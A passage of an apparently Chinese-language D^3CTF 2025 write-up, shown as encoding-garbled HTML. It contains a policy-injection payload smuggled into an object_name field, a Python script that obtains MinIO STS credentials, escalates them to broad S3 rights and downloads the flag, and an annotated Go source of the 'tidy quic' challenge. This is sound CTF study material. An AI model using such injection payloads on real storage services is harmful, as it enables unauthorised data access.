class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span>aaa<span class="string">&quot;</span></span><br><span class="line"><span class="string">      ]</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä½œä¸ºjsonç»“æ„æˆ‘ä¸ªäººæ„Ÿè§‰å…¶å®æœ‰ç‚¹é—®é¢˜<br>å› ä¸ºç¬¬ä¸€ä¸ªStatementä¸­æœ‰ä¸¤ä¸ªaction<br>ç„¶ååé¢ä¹Ÿæœ‰ä¹±æ•°æ®æ— æ³•å»æ‰<br>ä½†æ˜¯ç»è¿‡æœåŠ¡ç«¯å¥½åƒä¼šè‡ªåŠ¨çº é”™<br>å‘ä¸‹æ¥å°±å˜æˆä¿®æ­£åçš„æ•°æ®äº†ï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;s3:PutObject&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:s3:::d3invitation/&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;s3:PutObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;s3:GetBucketLocation&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;s3:ListAllMyBuckets&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;s3:ListBucket&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;**&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨å®˜æ–¹wpçš„<code>s3:*</code>å†™æ³•<br>è¿™æ ·çš„tokenå°±æ˜¯minioæœåŠ¡çš„æ‰€æœ‰æƒé™<br>ä»¥ä¸Šå°±æ˜¯æ ¸å¿ƒæ€è·¯<br>å¦‚ä½•ä½¿ç”¨tokenå»è®¿é—®minioæœåŠ¡å°±æ˜¯äº‘å®‰å…¨çš„å†…å®¹äº†<br>ä»¥åå­¦åˆ°ä¼šæƒ³èµ·æ¥è¿™é¢˜çš„<br>å½“ç„¶è¿™é‡Œå¯ä»¥ç”¨pythonè„šæœ¬å®Œæˆ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> minio <span class="keyword">import</span> Minio</span><br><span class="line"><span class="keyword">from</span> minio.error <span class="keyword">import</span> S3Error</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">BASE_URL = <span class="string">&quot;http://35.241.98.126:31138&quot;</span>  <span class="comment"># â† æ”¹æˆä½ çš„ç›®æ ‡åœ°å€</span></span><br><span class="line">UPLOAD_FILENAME = <span class="string">&#x27;&quot;],\&quot;Action\&quot;:[\&quot;s3:GetObject\&quot;,\&quot;s3:PutObject\&quot;]&#125;,&#123;&quot;Effect&quot;: &quot;Allow&quot;,&quot;Action&quot;: [&quot;s3:GetObject&quot;,&quot;s3:PutObject&quot;,&quot;s3:ListBucket&quot;,&quot;s3:ListAllMyBuckets&quot;,&quot;s3:GetBucketLocation&quot;],&quot;Resource&quot;: &quot;*&quot;&#125;]&#125;aaa&#x27;</span></span><br><span class="line">UPLOAD_CONTENT = <span class="string">b&quot;This is a test file from attacker.&quot;</span></span><br><span class="line">ACCESS_KEY = <span class="string">&quot;&quot;</span></span><br><span class="line">SECRET_KEY = <span class="string">&quot;&quot;</span></span><br><span class="line">BUCKET_NAME = <span class="string">&quot;flag&quot;</span></span><br><span class="line">SESSION_TOKEN=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: è·å–ä¸´æ—¶å‡­è¯</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_temp_creds</span>(<span class="params">object_name</span>):</span><br><span class="line">    <span class="keyword">global</span> ACCESS_KEY, SECRET_KEY, SESSION_TOKEN</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/api/genSTSCreds&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;object_name&quot;</span>: object_name&#125;</span><br><span class="line">    resp = requests.post(url, json=data)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] è·å–ä¸´æ—¶å‡­è¯æˆåŠŸ&quot;</span>)</span><br><span class="line">    <span class="comment"># temp=json.loads()</span></span><br><span class="line">    ACCESS_KEY= resp.json()[<span class="string">&#x27;access_key_id&#x27;</span>]</span><br><span class="line">    SECRET_KEY=resp.json()[<span class="string">&#x27;secret_access_key&#x27;</span>]</span><br><span class="line">    SESSION_TOKEN=resp.json()[<span class="string">&#x27;session_token&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> ACCESS_KEY,SECRET_KEY,SESSION_TOKEN</span><br><span class="line"><span class="comment"># MinIO server configuration</span></span><br><span class="line">get_temp_creds(UPLOAD_FILENAME)</span><br><span class="line"><span class="comment"># Initialize the MinIO client</span></span><br><span class="line"><span class="built_in">print</span>(ACCESS_KEY)</span><br><span class="line"><span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line"><span class="built_in">print</span>(SESSION_TOKEN)</span><br><span class="line">minio_client = Minio(</span><br><span class="line">    <span class="string">&quot;35.241.98.126:31500&quot;</span>,</span><br><span class="line">    access_key=ACCESS_KEY,</span><br><span class="line">    secret_key=SECRET_KEY,</span><br><span class="line">    session_token=SESSION_TOKEN,</span><br><span class="line">    secure=<span class="literal">False</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">object_name, download_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Download a file from the MinIO bucket.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        minio_client.fget_object(BUCKET_NAME, object_name, download_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] File &#x27;<span class="subst">&#123;object_name&#125;</span>&#x27; downloaded to &#x27;<span class="subst">&#123;download_path&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> S3Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error downloading file: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_objects</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;List all objects in the MinIO bucket.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        objects = minio_client.list_objects(BUCKET_NAME)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Objects in bucket:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> obj <span class="keyword">in</span> objects:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  - <span class="subst">&#123;obj.object_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> S3Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error listing objects: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_buckets</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;List all buckets in the MinIO server.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        buckets = minio_client.list_buckets()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Buckets:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(buckets)</span><br><span class="line">        <span class="keyword">for</span> bucket <span class="keyword">in</span> buckets:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  - <span class="subst">&#123;bucket.name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> S3Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error listing buckets: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">list_buckets()</span><br><span class="line">list_objects()</span><br><span class="line">download_file(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;1.txt&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="tidy-quic"><a href="#tidy-quic" class="headerlink" title="tidy quic"></a>tidy quic</h3><p>å¯¹æºç è¿›è¡Œä¸€ä¸ªå®¡ï¼š</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main <span class="comment">// å£°æ˜è¯¥æ–‡ä»¶å±äº main åŒ…ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åº</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ( <span class="comment">// å¯¼å…¥æ‰€éœ€çš„æ ‡å‡†åº“å’Œç¬¬ä¸‰æ–¹åº“</span></span><br><span class="line"><span class="string">&quot;bytes&quot;</span>                 <span class="comment">// å¯¼å…¥ bytes åŒ…ï¼Œç”¨äºå¤„ç†å­—èŠ‚åˆ‡ç‰‡</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span>                <span class="comment">// å¯¼å…¥ errors åŒ…ï¼Œç”¨äºåˆ›å»ºå’Œå¤„ç†é”™è¯¯</span></span><br><span class="line"><span class="string">&quot;github.com/libp2p/go-buffer-pool&quot;</span> <span class="comment">// å¯¼å…¥ go-buffer-pool åº“ï¼Œç”¨äºé«˜æ•ˆåœ°ç®¡ç†å­—èŠ‚ç¼“å†²åŒº</span></span><br><span class="line"><span class="string">&quot;github.com/quic-go/quic-go/http3&quot;</span> <span class="comment">// å¯¼å…¥ quic-go/http3 åº“ï¼Œç”¨äºæ”¯æŒ HTTP/3</span></span><br><span class="line"><span class="string">&quot;io&quot;</span>                    <span class="comment">// å¯¼å…¥ io åŒ…ï¼Œæä¾›äº† I/O åŸå§‹æ“ä½œæ¥å£</span></span><br><span class="line"><span class="string">&quot;log&quot;</span>                   <span class="comment">// å¯¼å…¥ log åŒ…ï¼Œç”¨äºè®°å½•æ—¥å¿—</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span>              <span class="comment">// å¯¼å…¥ net/http åŒ…ï¼Œæä¾›äº† HTTP å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„å®ç°</span></span><br><span class="line"><span class="string">&quot;os&quot;</span>                    <span class="comment">// å¯¼å…¥ os åŒ…ï¼Œæä¾›äº†æ“ä½œç³»ç»ŸåŠŸèƒ½ï¼Œä¾‹å¦‚è®¿é—®ç¯å¢ƒå˜é‡</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p pool.BufferPool <span class="comment">// å£°æ˜ä¸€ä¸ªå…¨å±€å˜é‡ pï¼Œç±»å‹ä¸º buffer-pool åº“ä¸­çš„ BufferPoolï¼Œç”¨äºç®¡ç†å­—èŠ‚ç¼“å†²åŒº</span></span><br><span class="line"><span class="keyword">var</span> ErrWAF = errors.New(<span class="string">&quot;WAF&quot;</span>) <span class="comment">// å£°æ˜ä¸€ä¸ªè‡ªå®šä¹‰é”™è¯¯ ErrWAFï¼Œç”¨äºè¡¨ç¤ºè¢« WAF (Web Application Firewall) æ‹¦æˆª</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; <span class="comment">// ç¨‹åºå…¥å£ç‚¹</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; <span class="comment">// å¯åŠ¨ä¸€ä¸ª Goroutine (è½»é‡çº§çº¿ç¨‹)</span></span><br><span class="line"><span class="comment">// åœ¨ 8080 ç«¯å£ä¸Šå¯åŠ¨ä¸€ä¸ª HTTPS æœåŠ¡å™¨ï¼Œä½¿ç”¨ server.crt å’Œ server.key ä½œä¸º TLS è¯ä¹¦å’Œå¯†é’¥</span></span><br><span class="line"><span class="comment">// è¯·æ±‚å¤„ç†é€»è¾‘ç”± &amp;mux&#123;&#125; (è‡ªå®šä¹‰çš„ mux ç±»å‹å®ä¾‹) æä¾›</span></span><br><span class="line">err := http.ListenAndServeTLS(<span class="string">&quot;:8080&quot;</span>, <span class="string">&quot;./server.crt&quot;</span>, <span class="string">&quot;./server.key&quot;</span>, &amp;mux&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123; <span class="comment">// å¦‚æœæœåŠ¡å™¨å¯åŠ¨å¤±è´¥ï¼Œè®°å½•è‡´å‘½é”™è¯¯å¹¶é€€å‡º</span></span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;() <span class="comment">// ç«‹å³æ‰§è¡Œè¿™ä¸ªåŒ¿åå‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; <span class="comment">// å¯åŠ¨å¦ä¸€ä¸ª Goroutine</span></span><br><span class="line"><span class="comment">// åœ¨ 8080 ç«¯å£ä¸Šå¯åŠ¨ä¸€ä¸ª HTTP/3 (åŸºäº QUIC) æœåŠ¡å™¨ï¼Œä½¿ç”¨ server.crt å’Œ server.key ä½œä¸ºè¯ä¹¦å’Œå¯†é’¥</span></span><br><span class="line"><span class="comment">// è¯·æ±‚å¤„ç†é€»è¾‘åŒæ ·ç”± &amp;mux&#123;&#125; æä¾›</span></span><br><span class="line">err := http3.ListenAndServeQUIC(<span class="string">&quot;:8080&quot;</span>, <span class="string">&quot;./server.crt&quot;</span>, <span class="string">&quot;./server.key&quot;</span>, &amp;mux&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123; <span class="comment">// å¦‚æœæœåŠ¡å™¨å¯åŠ¨å¤±è´¥ï¼Œè®°å½•è‡´å‘½é”™è¯¯å¹¶é€€å‡º</span></span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;() <span class="comment">// ç«‹å³æ‰§è¡Œè¿™ä¸ªåŒ¿åå‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125; <span class="comment">// è¿™æ˜¯ä¸€ä¸ªç©ºçš„ select è¯­å¥ï¼Œä¼šé˜»å¡ main Goroutineï¼Œé˜²æ­¢ç¨‹åºé€€å‡º</span></span><br><span class="line"><span class="comment">// è¿™æ ·å¯ä»¥ç¡®ä¿ä¸Šé¢å¯åŠ¨çš„ä¸¤ä¸ª Goroutine (HTTP/TLS å’Œ HTTP/3 æœåŠ¡å™¨) æŒç»­è¿è¡Œ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> mux <span class="keyword">struct</span> &#123; <span class="comment">// å®šä¹‰ä¸€ä¸ªåä¸º mux çš„ç»“æ„ä½“</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸º mux ç»“æ„ä½“å®ç° http.Handler æ¥å£çš„ ServeHTTP æ–¹æ³•</span></span><br><span class="line"><span class="comment">// è¿™ä¸ªæ–¹æ³•è´Ÿè´£å¤„ç†æ‰€æœ‰çš„ HTTP è¯·æ±‚</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*mux)</span></span> ServeHTTP(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line"><span class="keyword">if</span> r.Method == http.MethodGet &#123; <span class="comment">// å¦‚æœè¯·æ±‚æ–¹æ³•æ˜¯ GET</span></span><br><span class="line"><span class="comment">// å‘å®¢æˆ·ç«¯å†™å…¥ä¸€ä¸ªå›ºå®šçš„æ¬¢è¿æ¶ˆæ¯</span></span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;Hello D^3CTF 2025,I&#x27;m tidy quic in web.&quot;</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="comment">// ç»“æŸå¤„ç†å¹¶è¿”å›</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> r.Method != http.MethodPost &#123; <span class="comment">// å¦‚æœè¯·æ±‚æ–¹æ³•ä¸æ˜¯ POST (ä¸”ä¸æ˜¯ GET)</span></span><br><span class="line">w.WriteHeader(<span class="number">400</span>) <span class="comment">// è®¾ç½® HTTP çŠ¶æ€ç ä¸º 400 (Bad Request)</span></span><br><span class="line"><span class="keyword">return</span>             <span class="comment">// ç»“æŸå¤„ç†å¹¶è¿”å›</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf []<span class="type">byte</span>         <span class="comment">// å£°æ˜ä¸€ä¸ªå­—èŠ‚åˆ‡ç‰‡ bufï¼Œç”¨äºå­˜å‚¨è¯·æ±‚ä½“æ•°æ®</span></span><br><span class="line">length := <span class="type">int</span>(r.ContentLength) <span class="comment">// è·å–è¯·æ±‚ä½“çš„ Content-Length</span></span><br><span class="line"><span class="keyword">if</span> length == <span class="number">-1</span> &#123;              <span class="comment">// å¦‚æœ Content-Length ä¸º -1ï¼Œè¡¨ç¤ºé•¿åº¦æœªçŸ¥ (é€šå¸¸æ˜¯åˆ†å—ä¼ è¾“æˆ–æµå¼ä¼ è¾“)</span></span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line"><span class="comment">// ä»è¯·æ±‚ä½“ä¸­è¯»å–æ‰€æœ‰æ•°æ®ï¼Œå¹¶åŒ…è£…ä¸€ä¸ª textInterrupterWrap ä»¥è¿›è¡Œå†…å®¹æ£€æŸ¥</span></span><br><span class="line">buf, err = io.ReadAll(textInterrupterWrap(r.Body))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123; <span class="comment">// å¦‚æœè¯»å–è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯</span></span><br><span class="line"><span class="keyword">if</span> errors.Is(err, ErrWAF) &#123; <span class="comment">// å¦‚æœé”™è¯¯æ˜¯ ErrWAF (è¢« WAF æ‹¦æˆª)</span></span><br><span class="line">w.WriteHeader(<span class="number">400</span>)                     <span class="comment">// è®¾ç½®çŠ¶æ€ç ä¸º 400</span></span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;WAF&quot;</span>))          <span class="comment">// è¿”å› &quot;WAF&quot; æ¶ˆæ¯</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// å…¶ä»–é”™è¯¯</span></span><br><span class="line">w.WriteHeader(<span class="number">500</span>)                     <span class="comment">// è®¾ç½®çŠ¶æ€ç ä¸º 500 (Internal Server Error)</span></span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;error&quot;</span>))        <span class="comment">// è¿”å› &quot;error&quot; æ¶ˆæ¯</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="comment">// ç»“æŸå¤„ç†å¹¶è¿”å›</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// å¦‚æœ Content-Length å·²çŸ¥</span></span><br><span class="line">buf = p.Get(length)     <span class="comment">// ä»ç¼“å†²åŒºæ± ä¸­è·å–ä¸€ä¸ªæŒ‡å®šé•¿åº¦çš„å­—èŠ‚åˆ‡ç‰‡</span></span><br><span class="line"><span class="keyword">defer</span> p.Put(buf)        <span class="comment">// åœ¨å‡½æ•°è¿”å›å‰å°†ç¼“å†²åŒºæ”¾å›æ± ä¸­ï¼Œé¿å…å†…å­˜æ³„æ¼</span></span><br><span class="line">rd := textInterrupterWrap(r.Body) <span class="comment">// åŒ…è£…è¯·æ±‚ä½“ï¼Œä»¥ä¾¿è¿›è¡Œå†…å®¹æ£€æŸ¥</span></span><br><span class="line">i := <span class="number">0</span>                  <span class="comment">// åˆå§‹åŒ–å·²è¯»å–çš„å­—èŠ‚æ•°</span></span><br><span class="line"><span class="keyword">for</span> &#123;                   <span class="comment">// å¾ªç¯è¯»å–è¯·æ±‚ä½“</span></span><br><span class="line">n, err := rd.Read(buf[i:]) <span class="comment">// ä»åŒ…è£…è¿‡çš„è¯·æ±‚ä½“ä¸­è¯»å–æ•°æ®åˆ° buf ä¸­</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;         <span class="comment">// å¦‚æœè¯»å–å‘ç”Ÿé”™è¯¯</span></span><br><span class="line"><span class="keyword">if</span> errors.Is(err, io.EOF) &#123; <span class="comment">// å¦‚æœæ˜¯æ–‡ä»¶ç»“æŸç¬¦ (EOF)ï¼Œè¡¨ç¤ºè¯»å–å®Œæ¯•</span></span><br><span class="line"><span class="keyword">break</span> <span class="comment">// è·³å‡ºå¾ªç¯</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> errors.Is(err, ErrWAF) &#123; <span class="comment">// å¦‚æœæ˜¯ ErrWAF</span></span><br><span class="line">w.WriteHeader(<span class="number">400</span>)                     <span class="comment">// è®¾ç½®çŠ¶æ€ç ä¸º 400</span></span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;WAF&quot;</span>))          <span class="comment">// è¿”å› &quot;WAF&quot; æ¶ˆæ¯</span></span><br><span class="line"><span class="keyword">return</span>                                 <span class="comment">// ç»“æŸå¤„ç†å¹¶è¿”å›</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// å…¶ä»–é”™è¯¯</span></span><br><span class="line">w.WriteHeader(<span class="number">500</span>)                     <span class="comment">// è®¾ç½®çŠ¶æ€ç ä¸º 500</span></span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;error&quot;</span>))        <span class="comment">// è¿”å› &quot;error&quot; æ¶ˆæ¯</span></span><br><span class="line"><span class="keyword">return</span>                                 <span class="comment">// ç»“æŸå¤„ç†å¹¶è¿”å›</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i += n <span class="comment">// æ›´æ–°å·²è¯»å–çš„å­—èŠ‚æ•°</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥è¯·æ±‚ä½“æ˜¯å¦ä»¥ &quot;I want&quot; å¼€å¤´</span></span><br><span class="line"><span class="keyword">if</span> !bytes.HasPrefix(buf, []<span class="type">byte</span>(<span class="string">&quot;I want&quot;</span>)) &#123;</span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;Sorry I&#x27;m not clear what you want.&quot;</span>)) <span class="comment">// å¦‚æœä¸æ˜¯ï¼Œè¿”å›é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line"><span class="keyword">return</span>                                                    <span class="comment">// ç»“æŸå¤„ç†å¹¶è¿”å›</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ä»è¯·æ±‚ä½“ä¸­å»é™¤ &quot;I want&quot; å‰ç¼€ï¼Œå¹¶å»é™¤å‰åç©ºç™½</span></span><br><span class="line">item := bytes.TrimSpace(bytes.TrimPrefix(buf, []<span class="type">byte</span>(<span class="string">&quot;I want&quot;</span>)))</span><br><span class="line"><span class="keyword">if</span> bytes.Equal(item, []<span class="type">byte</span>(<span class="string">&quot;flag&quot;</span>)) &#123; <span class="comment">// å¦‚æœå¤„ç†åçš„å†…å®¹æ˜¯ &quot;flag&quot;</span></span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;FLAG&quot;</span>))) <span class="comment">// è¿”å›ç¯å¢ƒå˜é‡ FLAG çš„å€¼</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// å¦åˆ™</span></span><br><span class="line">_, _ = w.Write(item) <span class="comment">// è¿”å›å¤„ç†åçš„å†…å®¹</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ª wrap ç»“æ„ä½“ï¼Œå®ƒåµŒå…¥äº† io.ReadCloser æ¥å£ï¼Œå¹¶æ·»åŠ äº†é¢å¤–çš„å­—æ®µç”¨äº WAF é€»è¾‘</span></span><br><span class="line"><span class="keyword">type</span> wrap <span class="keyword">struct</span> &#123;</span><br><span class="line">io.ReadCloser <span class="comment">// åµŒå…¥ io.ReadCloser æ¥å£ï¼Œè¿™æ · wrap ç±»å‹å°±è‡ªåŠ¨æ‹¥æœ‰ Read å’Œ Close æ–¹æ³•</span></span><br><span class="line">ban           []<span class="type">byte</span> <span class="comment">// ç”¨äºå­˜å‚¨ç¦æ­¢çš„å­—èŠ‚åºåˆ— (ä¾‹å¦‚ &quot;flag&quot;)</span></span><br><span class="line">idx           <span class="type">int</span>    <span class="comment">// ç”¨äºè·Ÿè¸ªå½“å‰åŒ¹é…åˆ° ban åºåˆ—çš„ç´¢å¼•</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸º wrap ç»“æ„ä½“å®ç° Read æ–¹æ³•ï¼Œè¿™æ˜¯ io.Reader æ¥å£çš„ä¸€éƒ¨åˆ†</span></span><br><span class="line"><span class="comment">// è¿™ä¸ªæ–¹æ³•ä¼šåœ¨è¯»å–æ•°æ®æ—¶è¿›è¡Œ WAF æ£€æŸ¥</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *wrap)</span></span> Read(p []<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">n, err := w.ReadCloser.Read(p) <span class="comment">// é¦–å…ˆè°ƒç”¨åº•å±‚ io.ReadCloser çš„ Read æ–¹æ³•è¯»å–æ•°æ®</span></span><br><span class="line"><span class="comment">// å¦‚æœè¯»å–å‡ºé”™ä¸”ä¸æ˜¯ EOF (æ–‡ä»¶ç»“æŸç¬¦)</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !errors.Is(err, io.EOF) &#123;</span><br><span class="line"><span class="keyword">return</span> n, err <span class="comment">// ç›´æ¥è¿”å›é”™è¯¯</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// éå†åˆšåˆšè¯»å–åˆ°çš„æ•°æ® p</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line"><span class="comment">// å¦‚æœå½“å‰å­—èŠ‚ä¸ ban åºåˆ—ä¸­å½“å‰æœŸæœ›çš„å­—èŠ‚åŒ¹é…</span></span><br><span class="line"><span class="keyword">if</span> p[i] == w.ban[w.idx] &#123;</span><br><span class="line">w.idx++ <span class="comment">// åŒ¹é…ç´¢å¼•é€’å¢</span></span><br><span class="line"><span class="keyword">if</span> w.idx == <span class="built_in">len</span>(w.ban) &#123; <span class="comment">// å¦‚æœæ•´ä¸ª ban åºåˆ—éƒ½åŒ¹é…ä¸Šäº†</span></span><br><span class="line"><span class="keyword">return</span> n, ErrWAF <span class="comment">// è¿”å› ErrWAF é”™è¯¯ï¼Œè¡¨ç¤ºè§¦å‘äº† WAF</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// å¦‚æœä¸åŒ¹é…</span></span><br><span class="line">w.idx = <span class="number">0</span> <span class="comment">// é‡ç½®åŒ¹é…ç´¢å¼•</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n, err <span class="comment">// è¿”å›è¯»å–åˆ°çš„å­—èŠ‚æ•°å’ŒåŸå§‹çš„é”™è¯¯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// textInterrupterWrap å‡½æ•°ç”¨äºåˆ›å»ºä¸€ä¸ªæ–°çš„ wrap 